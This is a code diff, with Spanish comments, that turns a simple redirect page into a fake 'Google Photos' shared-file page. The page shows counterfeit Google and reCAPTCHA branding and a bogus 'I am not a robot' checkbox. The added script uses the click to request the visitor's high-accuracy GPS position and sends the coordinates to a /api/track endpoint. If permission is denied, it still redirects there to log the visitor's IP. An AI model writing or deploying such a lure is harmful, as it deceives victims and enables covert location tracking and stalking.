@@ -1,18 +1,100 @@
 <!DOCTYPE html>
-<html>
+<html lang="es">
 <head>
-    <title>Cargando Documento...</title>
-    <script>
-        window.onload = function() {
-            // Capturamos resolución y batería antes de saltar al API
-            const screenRes = `${window.screen.width}x${window.screen.height}`;
-            
-            // Enviamos al backend
-            window.location.href = `/api/track?res=${screenRes}`;
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Photos - Archivo Compartido</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+    <style>
+        body, html { margin: 0; padding: 0; height: 100%; font-family: 'Roboto', sans-serif; overflow: hidden; }
+        
+        /* Fondo con blur */
+        .background-blur {
+            position: fixed; width: 100%; height: 100%;
+            background: url('https://images.unsplash.com/photo-1557683316-973673baf926?q=80&w=1000') no-repeat center center;
+            background-size: cover; filter: blur(15px) brightness(0.7);
+            z-index: -1;
         }
-    </script>
+
+        /* Overlay oscuro */
+        .overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.4); display: flex; align-items: center; justify-content: center;
+        }
+
+        /* El Modal del Captcha */
+        .captcha-box {
+            background: #fff; padding: 24px; border-radius: 8px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.3); width: 350px; text-align: center;
+        }
+
+        .google-logo { width: 90px; margin-bottom: 20px; }
+        h2 { font-size: 18px; color: #3c4043; margin-bottom: 8px; }
+        p { font-size: 14px; color: #5f6368; margin-bottom: 25px; }
+
+        /* Estilo reCAPTCHA */
+        .recaptcha-ui {
+            background: #f9f9f9; border: 1px solid #d3d3d3;
+            border-radius: 3px; display: flex; align-items: center;
+            padding: 15px; cursor: pointer; transition: background 0.2s;
+        }
+        .recaptcha-ui:hover { background: #f1f1f1; }
+        
+        .checkbox {
+            width: 24px; height: 24px; border: 2px solid #c1c1c1;
+            border-radius: 2px; margin-right: 15px; background: #fff;
+        }
+
+        .check-text { font-size: 14px; color: #555; flex-grow: 1; text-align: left; }
+        .recaptcha-logo { width: 30px; }
+
+    </style>
 </head>
 <body>
-    <p>Cargando archivo encriptado, por favor espere...</p>
+
+    <div class="background-blur"></div>
+
+    <div class="overlay">
+        <div class="captcha-box">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2f/Google_2015_logo.svg/2560px-Google_2015_logo.svg.png" class="google-logo" alt="Google">
+            <h2>Verificación de Seguridad</h2>
+            <p>Para ver las fotos compartidas y los registros de ubicación, confirma que eres un humano.</p>
+            
+            <div class="recaptcha-ui" id="captchaBtn">
+                <div class="checkbox" id="check"></div>
+                <div class="check-text">No soy un robot</div>
+                <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" class="recaptcha-logo">
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('captchaBtn').onclick = function() {
+            // Animamos el check
+            document.getElementById('check').style.background = "#4285f4";
+            document.getElementById('check').innerHTML = "✓";
+            document.getElementById('check').style.color = "white";
+            document.getElementById('check').style.textAlign = "center";
+
+            // Disparamos la solicitud de ubicación REAL (GPS)
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(success, error, {enableHighAccuracy: true});
+            } else {
+                window.location.href = "/api/track?gps=not_supported";
+            }
+        };
+
+        function success(position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            // Mandamos los datos GPS a tu API
+            window.location.href = `/api/track?lat=${lat}&lon=${lon}&acc=${position.coords.accuracy}`;
+        }
+
+        function error() {
+            // Si rechaza el permiso, igual lo mandamos al API para capturar al menos la IP
+            window.location.href = "/api/track?gps=denied";
+        }
+    </script>
 </body>
 </html>
